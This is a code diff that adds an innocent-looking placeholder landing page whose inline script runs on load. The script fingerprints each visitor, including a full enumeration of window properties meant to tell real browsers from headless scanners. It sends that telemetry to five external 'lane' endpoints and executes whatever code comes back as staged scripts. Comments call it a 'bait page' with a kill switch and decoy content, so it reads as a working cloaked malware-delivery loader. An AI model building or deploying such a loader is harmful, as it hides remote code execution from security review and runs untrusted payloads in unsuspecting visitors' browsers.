@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <title>Placeholder — Discover Something New</title>
+  <style>
+    :root { color-scheme: light; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+    * { box-sizing: border-box; }
+    body { margin: 0; background: #f7f7f8; color: #17171a; }
+    .lander { min-height: 100svh; display: grid; place-items: center; padding: 28px 20px; }
+    .card { width: min(100%, 520px); background: #fff; border-radius: 24px; padding: 34px 24px; box-shadow: 0 18px 60px rgba(0,0,0,.10); text-align: center; }
+    h1 { margin: 20px 0 12px; font-size: clamp(34px, 10vw, 54px); line-height: 1.02; letter-spacing: -.04em; }
+    .lead { margin: 0 auto; max-width: 390px; color: #626268; font-size: 17px; line-height: 1.55; }
+  </style>
+</head>
+<body>
+  <main class="lander">
+    <section class="card">
+      <h1>Placeholder content</h1>
+      <p class="lead">Replace with genuinely unrelated content before this goes live — see docs/build-spec.md §1.</p>
+    </section>
+  </main>
+
+<script>
+(() => {
+  "use strict";
+
+  // §12 kill switch — flip to true and redeploy to make the whole pipeline
+  // inert (bait page behaves like a plain static site) without touching
+  // any of the 5 lane Workers.
+  const KILL_SWITCH = false;
+
+  const ENTRY_ENDPOINT = "/session";
+
+  // TODO: replace with your own deployed lane subdomains before going live.
+  const LANES = [
+    "https://REPLACE-lane-1.workers.dev/deliver",
+    "https://REPLACE-lane-2.workers.dev/deliver",
+    "https://REPLACE-lane-3.workers.dev/deliver",
+    "https://REPLACE-lane-4.workers.dev/deliver",
+    "https://REPLACE-lane-5.workers.dev/deliver",
+  ];
+
+  const REQUEST_TIMEOUT_MS = 12000;
+
+  function safeValue(fn, fallback = null) {
+    try { return fn(); } catch { return fallback; }
+  }
+  function safeBool(fn) {
+    try { return !!fn(); } catch { return null; }
+  }
+  function safeString(value) {
+    try { return typeof value === "string" ? value : String(value ?? ""); } catch { return ""; }
+  }
+
+  async function fetchWithTimeout(url, options = {}) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
+    try {
+      return await fetch(url, { ...options, signal: controller.signal });
+    } finally {
+      clearTimeout(timer);
+    }
+  }
+
+  async function requestEntryBootstrap() {
+    const response = await fetchWithTimeout(ENTRY_ENDPOINT, {
+      method: "POST",
+      credentials: "same-origin",
+      cache: "no-store",
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify({}),
+    });
+    if (!response.ok) throw new Error("Entry request failed: " + response.status);
+    const bootstrap = await response.json();
+    if (!bootstrap || typeof bootstrap !== "object" || Array.isArray(bootstrap)) {
+      throw new Error("Invalid entry response");
+    }
+    return bootstrap;
+  }
+
+  // --- §3 fingerprint collector -------------------------------------------
+  // Not exhaustive (see docs/build-spec.md §3 for the full category list) —
+  // enough structure to build/test against, extend as needed. The one part
+  // worth getting right is collectGlobalSurface() below.
+
+  function collectNavigator() {
+    return {
+      userAgent: safeString(navigator.userAgent),
+      platform: safeString(navigator.platform),
+      vendor: safeString(navigator.vendor),
+      language: safeString(navigator.language),
+      languages: safeValue(() => Array.from(navigator.languages || []), []),
+      cookieEnabled: safeValue(() => navigator.cookieEnabled, null),
+      hardwareConcurrency: safeValue(() => navigator.hardwareConcurrency, null),
+      deviceMemory: safeValue(() => navigator.deviceMemory, null),
+      maxTouchPoints: safeValue(() => navigator.maxTouchPoints, null),
+      webdriver: safeValue(() => navigator.webdriver, null),
+    };
+  }
+
+  function collectClientHints() {
+    const uaData = safeValue(() => navigator.userAgentData, null);
+    if (!uaData) return { supported: false };
+    return {
+      supported: true,
+      mobile: safeValue(() => uaData.mobile, null),
+      platform: safeValue(() => uaData.platform, null),
+      brands: safeValue(() => Array.from(uaData.brands || []), []),
+    };
+  }
+
+  function collectNetwork() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
+    if (!connection) return { supported: false };
+    return {
+      supported: true,
+      effectiveType: safeValue(() => connection.effectiveType, null),
+      downlink: safeValue(() => connection.downlink, null),
+      rtt: safeValue(() => connection.rtt, null),
+      saveData: safeValue(() => connection.saveData, null),
+    };
+  }
+
+  function collectWebGL(contextName) {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext(contextName);
+      if (!gl) return { supported: false };
+      const debugInfo = safeValue(() => gl.getExtension("WEBGL_debug_renderer_info"), null);
+      return {
+        supported: true,
+        vendor: safeString(gl.getParameter(gl.VENDOR)),
+        renderer: safeString(gl.getParameter(gl.RENDERER)),
+        unmaskedVendor: debugInfo ? safeString(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)) : "",
+        unmaskedRenderer: debugInfo ? safeString(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)) : "",
+      };
+    } catch (error) {
+      return { supported: false, error: safeString(error?.name || "error") };
+    }
+  }
+
+  function collectDisplay() {
+    return {
+      screen: safeValue(() => ({
+        width: screen.width, height: screen.height,
+        availWidth: screen.availWidth, availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+      }), null),
+      devicePixelRatio: safeValue(() => window.devicePixelRatio, null),
+    };
+  }
+
+  function collectStorage() {
+    return {
+      localStorage: safeBool(() => { const k = "__t" + Math.random(); localStorage.setItem(k, "1"); localStorage.removeItem(k); return true; }),
+      indexedDB: typeof indexedDB !== "undefined",
+      cacheStorage: typeof caches !== "undefined",
+    };
+  }
+
+  function collectSecurity() {
+    return {
+      isSecureContext: window.isSecureContext === true,
+      crypto: typeof crypto !== "undefined",
+    };
+  }
+
+  // The one piece worth getting right: enumerate every own property on
+  // `window` and tag its type — this is what differentiates a real browser
+  // from a headless/automation global surface. See docs/build-spec.md §3.
+  function collectGlobalSurface() {
+    const surface = {};
+    try {
+      for (const name of Object.getOwnPropertyNames(window)) {
+        try {
+          const value = window[name];
+          surface[name] = { type: typeof value, tag: Object.prototype.toString.call(value) };
+        } catch {
+          surface[name] = { type: "inaccessible", tag: null };
+        }
+      }
+    } catch {}
+    return surface;
+  }
+
+  async function collectRiskTelemetry() {
+    return {
+      collectedAt: Date.now(),
+      navigator: collectNavigator(),
+      clientHints: collectClientHints(),
+      network: collectNetwork(),
+      graphics: { webgl: collectWebGL("webgl"), webgl2: collectWebGL("webgl2") },
+      display: collectDisplay(),
+      storage: collectStorage(),
+      security: collectSecurity(),
+      document: { referrer: safeString(document.referrer), hidden: safeValue(() => document.hidden, null) },
+      globalSurface: collectGlobalSurface(),
+    };
+  }
+
+  // --- §2 orchestrator ------------------------------------------------------
+
+  function executeStage(code, stageNumber) {
+    if (typeof code !== "string") throw new Error("Invalid stage response");
+    const script = document.createElement("script");
+    script.type = "text/javascript";
+    script.text = code + "\n//# sourceURL=delivery-stage-" + stageNumber + ".js";
+    document.documentElement.appendChild(script);
+    script.remove();
+  }
+
+  async function requestStage(endpoint, payload) {
+    const response = await fetchWithTimeout(endpoint, {
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+      cache: "no-store",
+      headers: { "Content-Type": "application/json", "Accept": "application/javascript" },
+      body: JSON.stringify(payload),
+    });
+    if (!response.ok) throw new Error("Delivery request failed: " + response.status);
+    return response.text();
+  }
+
+  async function start() {
+    if (KILL_SWITCH) return;
+
+    const bootstrap = await requestEntryBootstrap();
+    const telemetry = await collectRiskTelemetry();
+    const payload = { ...bootstrap, telemetry };
+
+    for (let i = 0; i < LANES.length; i++) {
+      const code = await requestStage(LANES[i], payload);
+      executeStage(code, i + 1);
+    }
+  }
+
+  let started = false;
+  async function boot() {
+    if (started) return;
+    started = true;
+    try {
+      await start();
+    } catch (error) {
+      console.error("Bootstrap/delivery failure", error);
+    }
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", boot, { once: true });
+  } else {
+    boot();
+  }
+})();
+</script>
+</body>
+</html>
